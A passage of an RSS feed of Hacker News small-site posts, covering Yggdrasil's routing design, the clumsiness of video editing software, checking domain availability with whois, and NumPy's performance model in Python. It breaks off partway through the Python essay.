What’s worse, the kinds of network topologies that show up in practice (small-world / scale-free networks) are among the topologies for which hierarchical addressing and CIDR are least effective at aggregating routes, which contributes to (and I dare say, <em>causes</em>) very large <a href="https://en.wikipedia.org/wiki/Border_Gateway_Protocol">BGP</a> routing tables in the <a href="https://en.wikipedia.org/wiki/Default-free_zone">DFZ</a>.</p>

<h3 id="compact-routing">Compact Routing</h3>

<p>So, what if we didn’t do that?</p>

<p><a href="https://arxiv.org/abs/0708.2309">Compact routing</a> is the study of the fundamental trade-off between the stretch of a routing scheme (the length of the paths it finds, relative to the shortest paths in the network) vs the size of the routing table required to find a path.
Essentially, compact routing proposes that, rather than require each node in the network be able to find the <em>best</em> path, we only require that they find a <em>good</em> path.
In doing so, it becomes possible to reduce the size of each node’s routing table.</p>

<p>To skip over the details, there are basically two aspects to consider that are relevant to this post.
First, compact routing schemes can be name-dependent or name-independent.
Name-dependent routing schemes assign an address (of some kind, not necessarily a familiar IP address) based on a node’s location in the network.
Name-independent routing schemes place no requirements on a node’s address, and treat it as some opaque identifier in a flat (i.e. non-subnetted) address space.
Secondly, compact routing schemes can either be a universal scheme, with strong guarantees on all possible network types, or they can be specific to certain network topologies.</p>

<p>On paper, compact routing is essentially a solved problem: universal name-dependent routing schemes are known with worst case scenario performance guarantees that are basically equal to the best case scenario lower bounds proven by the mathematicians who do that sort of thing.
Furthermore, name-independent routing schemes are known with the same performance guarantees, albeit much worse observed performance <em>in practice</em> (still better than the guaranteed worst cases, but not by as much).
However, practical compact routing has yet to be realized.
Although the schemes themselves are known, in the sense that someone with a full view of the network can figure out who needs to know what to route packets effectively, a distributed algorithm suitable for dynamic networks is still a topic of ongoing work, and no publicly available implementation.</p>

<h3 id="greedy-embedded-routing">Greedy Embedded Routing</h3>

<p>So, what if we didn’t do that?</p>

<p><a href="https://en.wikipedia.org/wiki/Greedy_embedding">Greedy embedded</a> routing algorithms take a slightly different approach.
Instead of a routing table about some remote subset of the network, each node knows information about itself and its directly connected (one-hop) neighbors, which we refer to as “peers” in Yggdrasil.
In particular, each node knows the location of itself, and its peers, in some metric space.</p>

<p>For example: consider the case of a two-dimensional square grid, with no gaps, holes, or other irregularities that could obstruct the flow of traffic.
Every node’s “address” is simply the X and Y coordinates of the node in the network.
Because there are no gaps in this example, every node can route traffic simply by forwarding it to any neighbor which is closer to the destination’s X-Y coordinates than itself.
This is called a greedy routing strategy, and coordinate systems where this strategy is guaranteed to work are called greedy embeddings.</p>

<p>While there is no finite dimensional Euclidean space for which a greedy embedding exists on all possible graphs, so the dimension of Euclidean embeddings need to be changed due to network size and topology, which …</p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://yggdrasil-network.github.io/2018/07/17/world-tree.html">https://yggdrasil-network.github.io/2018/07/17/world-tree.html</a></em></p>]]>
            </description>
            <link>https://yggdrasil-network.github.io/2018/07/17/world-tree.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512311</guid>
            <pubDate>Fri, 18 Sep 2020 02:24:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[S-Flux V3, Flux pattern implementation with the ease of use of a Redux]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512310">thread link</a>) | @nomoredeps
<br/>
September 17, 2020 | https://nomoredeps.github.io/shadowjs | <a href="https://web.archive.org/web/*/https://nomoredeps.github.io/shadowjs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://nomoredeps.github.io/shadowjs</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512310</guid>
            <pubDate>Fri, 18 Sep 2020 02:24:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why is video editing so horrible today?]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512292">thread link</a>) | @pavel_lishin
<br/>
September 17, 2020 | https://blog.rememberlenny.com/2020/09/15/why-is-video-editing-so-horrible-today/ | <a href="https://web.archive.org/web/*/https://blog.rememberlenny.com/2020/09/15/why-is-video-editing-so-horrible-today/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><main id="genesis-content"><article itemscope="" itemtype="https://schema.org/CreativeWork"><div itemprop="text"><p>Reading Time: 5 minutes read</p>




<p>In the last three months, I have done more video post-production than I have done in the past 12 years. Surprisingly, in these years, nothing seems to have changed. Considering how much media is now machine analyzable content, such as audio and visual, I’m surprised there aren’t more patterns that make navigating and arranging video content faster. Beyond that, I’m surprised there isn’t more process for programmatically composing video in a polished complimentary way to the existing manual methods of arranging.</p>



<p>In 1918, when the video camera was created, if you filmed something and wanted to edit it, you took your footage, cut it and arranged it according to how you wanted it to look. Today, if you want to edit a video, you have to import the source assets into a specialty program (such as Adobe Premiere), and then manually view each item to watch/listen for the portion that you want. Once you have the sections of each imported asset, you have to manually arrange each item on a timeline. Of course a ton has changed, but the general workflow feels the same.</p>



<div><figure><img src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/editing._D18377.jpg?resize=379%2C395&amp;ssl=1" alt="Should Critics and Festivals Give Editing Awards? Yes, and Here's Why |  IndieWire" width="379" height="395" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/editing._D18377.jpg?resize=379%2C395&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Real life photo of me navigating my Premiere assets folders</figcaption></figure></div>



<p>How did video production and editing not get its digital-first methods of creation? Computing power has skyrocketed. Access to storage is generally infinite. And our computers are networked around the world. How is it that the workflow of import, edit, and export take so long?</p>



<p>The consumerization of video editing has simplified certain elements by abstracting away seemingly important but complicated components, such as the linearity of time. Things like Tiktok seem to be the most dramatic shift in video creation, in that the workflow shifts from immediate review and reshooting of video. Over the years, the iMovies and such have moved timelines, from horizontal representation of elapsed time into general blocks of “scenes” or clips. The simplification through abstraction is important for the general consumer, but reduces the attention to detail. This creates an aesthetic of its own, which seems to be the result of the changing of tools. </p>



<p>Where are all the things I take for granted in developer tools, like autocomplete or class-method search, in the video equivalent? What is autocomplete look like in editing a video clip? Where are the repeatable “patterns” I can write once, and reuse everywhere? Why does each item on a video canvas seem to live in isolation from one another, with no awareness of other elements or an ability to interact with each other?</p>



<div><figure><img src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=352%2C175&amp;ssl=1" alt="" width="352" height="175" srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=1024%2C513&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=768%2C385&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?zoom=2&amp;resize=352%2C175&amp;ssl=1 704w" sizes="(max-width: 352px) 100vw, 352px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=1024%2C513&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=768%2C385&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?zoom=2&amp;resize=352%2C175&amp;ssl=1 704w" data-lazy-src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=352%2C175&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>My code editor searches my files and tried to “import” the methods when I start typing.</figcaption></figure></div>



<p>As someone who studied film and animation exclusively for multiple years, I’m generally surprised that the overall ways of producing content are largely the same as they have been 10 years ago, but also seemingly for the past 100.</p>



<p>I understand that the areas of complexity have become more niche, such as in VFX or multi-media. I have no direct experience with any complicated 3D rendering and I haven’t tried any visual editing for non-traditional video displays, so its a stretch to say film hasn’t changed at all. I haven’t touched the surface in new video innovation, but all considering, I wish some basic things were much easier.</p>



<p>For one, when it comes to visual layout, I would love something like the Figma “autolayout” functionality. If I have multiple items in a canvas, I’d like them to self-arrange based on some kind of box model. There should be a way to assign the equivalent of styles as “classes”, such as with CSS, and multiple text elements should be able to inherit/share padding/margin definitions. Things like flexbox and relative/absolute positioning would make visual templates significantly much easier and faster for developing fresh video content.</p>



<div><figure><img src="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=368%2C157&amp;ssl=1" alt="" width="368" height="157" srcset="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1024%2C438&amp;ssl=1 1024w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=300%2C128&amp;ssl=1 300w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=768%2C328&amp;ssl=1 768w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1536%2C656&amp;ssl=1 1536w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=2048%2C875&amp;ssl=1 2048w" sizes="(max-width: 368px) 100vw, 368px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1024%2C438&amp;ssl=1 1024w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=300%2C128&amp;ssl=1 300w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=768%2C328&amp;ssl=1 768w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1536%2C656&amp;ssl=1 1536w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=2048%2C875&amp;ssl=1 2048w" data-lazy-src="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=368%2C157&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Currently I make visual frames in Figma, then export them because its so much easier than fumbling through the 2D translations in Premiere</figcaption></figure></div>



<p>I would love to have a “smarter” timeline that can surface “cues” that I may want to hook into for visual changes. The cues could make use of machine analyzable features in the audio and video, based on features detected in the available content. This is filled with lots of hairy areas, and definitely sounds nicer than it might be in actuality. At a basic example, the timeline could look at audio or a transcript and know when a certain speaker is talking. There are already services, such as Descript, that make seamless use of speaker detection. That should find some expression in video editing software. Even if the software itself doesn’t detect this information, the metadata from other software should be made use of.</p>



<figure><img src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;ssl=1" alt="" srcset="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;ssl=1 1024w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=300%2C230&amp;ssl=1 300w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=768%2C589&amp;ssl=1 768w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?w=1256&amp;ssl=1 1256w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;ssl=1 1024w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=300%2C230&amp;ssl=1 300w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=768%2C589&amp;ssl=1 768w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?w=1256&amp;ssl=1 1256w" data-lazy-src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>The two basic views in Zoom. Grid or speaker.</figcaption></figure>



<p>More advanced would be to know when certain exchanges between multiple people are a self-encompassed “point”. Identifying when a “exchange” takes place, or when a “question” is “answered”, would be useful for title slides or lower-thirds with complimentary text.</p>



<div><figure><img src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=350%2C255&amp;ssl=1" alt="" width="350" height="255" srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=1024%2C746&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=300%2C218&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=768%2C559&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?w=1450&amp;ssl=1 1450w" sizes="(max-width: 350px) 100vw, 350px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=1024%2C746&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=300%2C218&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=768%2C559&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?w=1450&amp;ssl=1 1450w" data-lazy-src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=350%2C255&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Descript will identify speakers and color code the transcript.</figcaption></figure></div>



<p>If there are multiple shots of the same take, it would be nice to have the clips note where the beginning and end based on lining up the audio. Reviewing content shouldn’t be done in a linear fashion if there are ways to distinguish content of video/audio clip and compare it to itself or other clips.</p>



<p>In line with “cues”, I would like to “search” my video in a much more comprehensive way. My iPhone photos app lets me search by faces or location. How about that in my video editor? All the video clips with a certain face or background?</p>



<p>Also, it would be nice to generate these “features” with some ease. I personally dont know what it would take to train a feature detector by viewing some parts of a clip, labeling it, and then using the labeled example to find the other instances of similar kinds of visual content. I do know its possible, and that would be very useful for speeding up the editing process.</p>



<p>In my use case, I’m seeing a lot of video recordings of Zoom calls or webinars. This is another example of video content that generally looks the “same” and could be analyzed for certain content types. I would be able to quickly navigate through clips if I could be able to filter video by when the video is a screen of many faces viewed at once, or when only one speaker is featured at a time. </p>



<p>All of this to say, there is a lot of gaps in the tools available at the moment.</p>

</div></article></main></div></div></div>]]>
            </description>
            <link>https://blog.rememberlenny.com/2020/09/15/why-is-video-editing-so-horrible-today/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512292</guid>
            <pubDate>Fri, 18 Sep 2020 02:20:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to search for domain names securely]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512106">thread link</a>) | @stanislavb
<br/>
September 17, 2020 | https://stanbright.com/domain-name-search/ | <a href="https://web.archive.org/web/*/https://stanbright.com/domain-name-search/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      <div>
        

<p>
  <iframe width="560" height="315" src="https://www.youtube.com/embed/sP50FsAFJls" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

<p>Yup, domain names are very important for every business, project or idea
you want to spread on the Internet. Many people spend a log of energy
on finding the perfect name only to find out that the relevant “.com” domain has been taken.
It is not a surprise South Park has an episode on that.</p>

<p>There are three major ways to perform a <strong>domain name search</strong> and see if
the domain you are looking for is FREE.</p>

<h2 id="first---check-the-domain-availability-directly-on-your-domain-name-registrar">First - check the domain availability directly on your domain name registrar</h2>

<p>This is the go-to method for most people. It is the most direct and works in general.
Why “in general”? Because you should trust your <a href="https://www.saashub.com/best-domain-name-registrar-software" target="_blank">domain name registrar</a>.
It is not easy to prove; however, it is believed that some registrars are involved
in <a href="https://en.wikipedia.org/wiki/Cybersquatting" target="_blank">Cybersquatting</a>. You can read
this relevant thread on Hacker News - <a href="https://news.ycombinator.com/item?id=24506303" target="_blank">Tell HN: Never search for domains on Godaddy.com</a>.
What is happening is that you search for your shiny new domain name, it is FREE,
but you decide to postpone buying it immediately.
However, a few days later, when you have mustered up the enthusiasm to buy the name,
you find out that your name is already taken. Believe me, it’s a very saddening feeling.</p>

<p>The tricky part is that by using their search, registrars KNOW which
domain names you are interested in as well as the trendy names
that people, on the whole, are looking for. So, they have the data and means to
buy those domains and then try reselling them for more (Cybersquatting).
Of course, if they are caught doing that, it could be detrimental to their business.
That’s why I still believe that most registrars are not doing it.
Yet you never know.</p>

<h2 id="second---check-availability-through-a-third-party-service">Second - check availability through a third-party service</h2>

<p>This is one of the options I’ve been using from time to time. These are utility services
that make money when they refer you to the domain name registrars. For example,
<a href="https://www.namebounce.com/" target="_blank">NameBounce</a> and its <a href="https://www.saashub.com/namebounce-alternatives" target="_blank">alternatives</a>
can generate a few dozens of free domain names based on a keyword.
In my opinion, this is a bit safer as long as you use a generic keyword.
In most cases the base “keyword.com” will be taken but you will be given a list of
dozens of other free options (e.g. Keyword<b>Life</b>.com <b>Max</b>Keyword.com, etc)
So, whoever knows that you have interest in <em>keyword.com</em>, they can’t know which of
the other hundred options you’ve decided to use. Moreover, it will be very expensive
to grab all of them.</p>



<p>This is not the most straightforward option, but it is <strong>the most secure way to perform
a <em>domain name search</em></strong> and check if a name is available. What you have to do is
opening a terminal typing <code>whois my-domain-name.com</code> (<code>whois -v my-domain-name.com</code> if using Windows)
and reading/interpreting the results.</p>

<p>In the response from the server, you can find out who and when registered the name
and if it is free. There are two inconveniences following this approach. You
have to read all the data (a few screens) that was returned and learn to read it.
That may take some time if you don’t have experience. If the name is free,
somewhere at the end of the whois-response,
there will be a line like <code>No match for domain "SAASHUB123.COM".</code>.
Then, when you decide, just go and register the domain.</p>

<p>As this third option is my preferred approach for checking names, I’ve been using
a simple bash script that automates the boring parts. You can copy-paste it
from this Github gist - <a href="https://gist.github.com/StanBright/b236675e272ace1b385a9a0f2d543a1f" target="_blank">domain_check.sh</a>.
To set it up, copy that script to your <code>~/bin</code> directory, <code>chmod 755 ~/domain-check.sh</code> and list
all extensions (separated by a space) in the <code>DOMAINS=( '.com' '.io' )</code> section.</p>

<p>Then checking for an available name is as simple as opening your terminal, and
you don’t have to worry that someone will register the same name tomorrow.</p>

<div><div><pre><code>stan@StansMacBook15:~$ domain_check.sh saashub123
saashub123.com - available
saashub123.io - available
</code></pre></div></div>
<p><br>
And remember to follow “<a href="https://stanbright.com/3-day-rule">The 3 day domain name rule</a>”
before buying any new names.</p>


<div>
  <p>
    Stan
  </p>
  <p>
    Sep 18, 2020<br>
    // Tech
  </p>
</div>




<hr>


      </div>
    </div>
  </div></div>]]>
            </description>
            <link>https://stanbright.com/domain-name-search/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512106</guid>
            <pubDate>Fri, 18 Sep 2020 01:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Oriented Programming in Python]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24511966">thread link</a>) | @brilee
<br/>
September 17, 2020 | https://www.moderndescartes.com/essays/data_oriented_python/ | <a href="https://web.archive.org/web/*/https://www.moderndescartes.com/essays/data_oriented_python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
	

<p> Originally posted 2020-09-13</p>
<p> Tagged: <a href="https://www.moderndescartes.com/essays/tags/optimization">optimization</a>, <a href="https://www.moderndescartes.com/essays/tags/computer_science">computer_science</a>, <a href="https://www.moderndescartes.com/essays/tags/python">python</a></p>
<p> <em>Obligatory disclaimer: all opinions are mine and not of my employer </em></p>
<hr>

<p>Many users of Python deprioritize performance in favor of soft benefits like ergonomics, business value, and simplicity. Users who prioritize performance typically end up on faster compiled languages like C++ or Java.</p>
<p>One group of users is left behind, though. The scientific computing community has lots of raw data they need to process, and would very much like performance. Yet, they struggle to move away from Python, because of network effects, and because Python’s beginner-friendliness is appealing to scientists for whom programming is not a first language. So, how can Python users achieve some fraction of the performance that their C++ and Java friends enjoy?</p>
<p>In practice, scientific computing users rely on the NumPy family of libraries e.g.&nbsp;NumPy, SciPy, TensorFlow, PyTorch, CuPy, JAX, etc.. The sheer proliferation of these libraries suggests that the NumPy model is getting something right. In this essay, I’ll talk about what makes NumPy so effective, and where the next generation of Python numerical computing libraries (e.g.&nbsp;TensorFlow, PyTorch, JAX) seems to be headed.</p>
<h2 id="data-good-pointers-bad">Data good, pointers bad</h2>
<p>A pesky fact of computing is that computers can compute far faster than we can deliver data to compute on. In particular, data transfer <em>latency</em> is the Achille’s heel of data devices (both RAM and storage). Manufacturers disguise this weakness by emphasizing improvements in data transfer <em>throughput</em>, but latency continues to stagnate. Ultimately, this means that any chained data access patterns, where one data retrieval must be completed before the next may proceed, are the worst case for computers.</p>
<p>These worst-case chained data access patterns are unfortunately quite common – so common that they have a name you may be familiar with: a pointer.</p>
<p>Pointers have always been slow. In the ’80s and ’90s, our hard drives were essentially optimized record players, with a read head riding on top of a spinning platter. These hard drives had physical limitations: The disk could only spin so fast without shattering, and the read head was also mechanical, limiting its movement speed. Disk seeks were slow, and the programs that were most severely affected were databases. Some ways that databases dealt with these physical limitations are:</p>
<ul>
<li>Instead of using binary trees (requiring <span>\(\log_2 N\)</span> disk seeks), B-trees with a much higher branching factor <span>\(k\)</span> were used, only requiring <span>\(\log_k N\)</span> disk seeks.</li>
<li>Indices were used to query data without having to read the full contents of each row.</li>
<li>Vertically-oriented databases optimized for read-heavy workloads (e.g.&nbsp;summary statistics over one field, across entire datasets), by reorganizing from <a href="https://en.wikipedia.org/wiki/AoS_and_SoA">arrays of structs to structs of arrays</a>. This maximized effective disk throughput, since no extraneous data was loaded.</li>
</ul>
<p>Today, compute speed is roughly <span>\(10^5 - 10^6\)</span> times faster than in 1990. Today, RAM is roughly <span>\(10^5\)</span> times faster than HDDs from 1990. I was amused and unsurprised to find that Raymond Hettinger’s <a href="https://www.youtube.com/watch?v=npw4s1QTmPg">excellent talk on the evolution of Python’s in-memory <code>dict</code> implementation</a> plays out like a brief history of early database design. Time, rather than healing things, has only worsened the compute-memory imbalance.</p>
<h2 id="numpys-optimizations">NumPy’s optimizations</h2>
<h3 id="boxing-costs">Boxing costs</h3>
<p>In many higher-level languages, raw data comes in boxes containing metadata and a pointer to the actual data. In Python, the PyObject box holds reference counts, so that the garbage collector can operate generically on all Python entities.</p>
<p>Boxing creates two sources of inefficiency:</p>
<ul>
<li>The metadata bloats the data, reducing the data density of our expensive memory.</li>
<li>The pointer indirection creates another round trip of memory retrieval latency.</li>
</ul>
<p>A NumPy array can hold many raw data within a single PyObject box, <em>provided that all of those data are of the same type</em> (int32, float32, etc.). By doing this, NumPy amortizes the cost of boxing over multiple data.</p>
<p>In <a href="https://www.moderndescartes.com/essays/deep_dive_mcts">my previous investigations into Monte Carlo tree search</a>, a naive UCT implementation performed poorly because it instantiated millions of UCTNode objects whose sole purpose was to hold a handful of float32 values. In the optimized UCT implementation, these nodes were replaced with NumPy arrays, reducing memory usage by a factor of 30.</p>
<h3 id="attribute-lookup-function-dispatch-costs">Attribute lookup / function dispatch costs</h3>
<p>Python’s language design forces an unusually large amount of pointer chasing. I mentioned boxing as one layer of pointer indirection, but really it’s just the tip of the iceberg.</p>
<p>Python has no problem handling the following code, even though each of these multiplications invokes a completely different implementation.</p>
<pre><code>&gt;&gt;&gt; mixed_list = [1, 1.0, 'foo', ('bar',)]
&gt;&gt;&gt; for obj in mixed_list:
...     print(obj * 2)

2
2.0
'foofoo'
('bar', 'bar')</code></pre>
<p>Python accomplishes this with a minimum of two layers of pointer indirection:</p>
<ol type="1">
<li>Look up the type of the object.</li>
<li>Look up and execute the <code>__mul__</code> function from that type’s operation registry.</li>
</ol>
<p>Additional layers of pointer indirection may be required if the <code>__mul__</code> method is defined on a superclass: the chain of superclasses must be traversed, one pointer at a time, until an implementation is found.</p>
<p>Attribute lookup is similarly fraught; <code>@property</code>, <code>__getattr__</code>, and <code>__getattribute__</code> provide users with flexibility that incurs pointer chasing overhead with something as simple as executing <code>a.b</code>. Access patterns like <code>a.b.c.d</code> create exactly the chained data access patterns that are a worst-case for data retrieval latency.</p>
<p>To top it all off, merely <em>resolving</em> the object is expensive: there’s a stack of lexical scopes (local, nonlocal, then global) that are checked in order to find the variable name. Each check requires a dictionary lookup, another source of pointer indirection.</p>
<p>As the saying goes: “We can solve any problem by introducing an extra level of indirection… except for the problem of too many levels of indirection”. The NumPy family of libraries deals with this indirection, not by removing it, but again by sharing its cost over multiple data.</p>
<pre><code>&gt;&gt;&gt; homogenous_array = np.arange(5, dtype=np.float32)
&gt;&gt;&gt; multiply_by_two = homogenous_array * 2
&gt;&gt;&gt; print(multiply_by_two)
array([ 0.,  2.,  4.,  6.,  8.], dtype=float32)</code></pre>
<p>Sharing a single box for multiple data allows NumPy to retain the expressiveness of Python while minimizing the cost of the dynamism. As before, this works because of the additional constraint that all data in a NumPy array must have identical type.</p>
<h2 id="the-frontier-jit">The Frontier: JIT</h2>
<p>So far, we’ve seen that NumPy doesn’t solve any of Python’s fundamental problems when it comes to pointer overhead. Instead, it merely puts a bandaid on the problem by sharing those costs across multiple data. It’s a pretty successful strategy – in my hands (<a href="https://www.moderndescartes.com/essays/vectorized_pagerank">1</a>, <a href="https://www.moderndescartes.com/essays/deep_dive_mcts">2</a>), I find that NumPy can typically achieve 30-60x speedups over pure Python solutions to dense numerical code. However, given that C code typically achieves <a href="https://www.moderndescartes.com/essays/data_oriented_python/(https://benchmarksgame-team.pages.debian.net/benchmarksgame/fastest/python3-gcc.html)">100-200x performance</a> over pure Python on dense numerical code (common in scientific computing), it would be nice if we could further reduce the Python overhead.</p>
<p>Tracing <a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">JITs</a> promise to do exactly this. Roughly, the strategy is to trace the execution of the code and record the pointer chasing outcomes. Then, when you call the same code snippet, reuse the recorded outcomes! NumPy amortizes Python overhead over multiple data, and JIT amortizes Python overhead over multiple function calls.</p>
<p>(I should note that I’m most familiar with the tracing JITs used by TensorFlow and JAX. <a href="https://doc.pypy.org/en/latest/">PyPy</a> and <a href="https://numba.pydata.org/">Numba</a> are two alternate JIT implementations that have a longer history, but I don’t know enough about them to treat them fairly, so my apologies to readers.)</p>
